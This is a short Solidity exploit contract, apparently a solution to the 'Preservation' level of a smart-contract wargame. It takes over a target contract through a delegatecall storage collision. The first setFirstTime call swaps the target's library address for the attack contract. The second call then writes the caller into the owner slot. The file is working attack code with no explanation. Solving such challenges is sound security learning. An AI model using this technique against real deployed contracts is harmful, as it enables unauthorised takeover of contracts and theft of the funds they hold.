// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;
import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
interface Preservation {
    function setFirstTime(uint256 _time) external;
}

contract Attack {
    uint256 public preservation;
    uint256 public dummy2;
    address public target1;

    constructor(address _preservation) {
        preservation = uint256(uint160(_preservation));
    }

    function setTime(uint256 _time) external {
        target1 = address(uint160(_time));
    }
    function attack() external {
        Preservation target = Preservation(address(uint160(preservation)));
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
    }
}